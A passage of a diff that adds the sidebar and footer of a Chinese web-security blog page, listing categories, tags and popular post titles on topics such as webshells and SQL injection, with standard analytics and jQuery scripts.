+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
+        
+        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
+        
+        <a rel="tag" href="../tag/2019.html">2019</a>
+        
+        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
+        
+        <a rel="tag" href="../tag/php.html">php</a>
+        
+        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
+        
+        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
+        
+        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
+        
+        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
+        
+        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/%E9%98%BB%E6%AD%A2%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C.html">阻止脚本运行</a>
+        
+        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
+        
+        <a rel="tag" href="../tag/django.html">django</a>
+        
+        <a rel="tag" href="../tag/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0.html">断点续传</a>
+        
+        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
+        
+        <a rel="tag" href="../tag/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html">信息泄露</a>
+        
+        <a rel="tag" href="../tag/getshell.html">getshell</a>
+        
+        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
+        
+        <a rel="tag" href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>
+        
+        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
+        
+        <a rel="tag" href="../tag/API%E5%87%BD%E6%95%B0.html">API函数</a>
+        
+        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
+        
+        <a rel="tag" href="../tag/webshell.html">webshell</a>
+        
+        <a rel="tag" href="../tag/%E8%84%B1%E8%A3%A4.html">脱裤</a>
+        
+        <a rel="tag" href="../tag/SQL.html">SQL</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
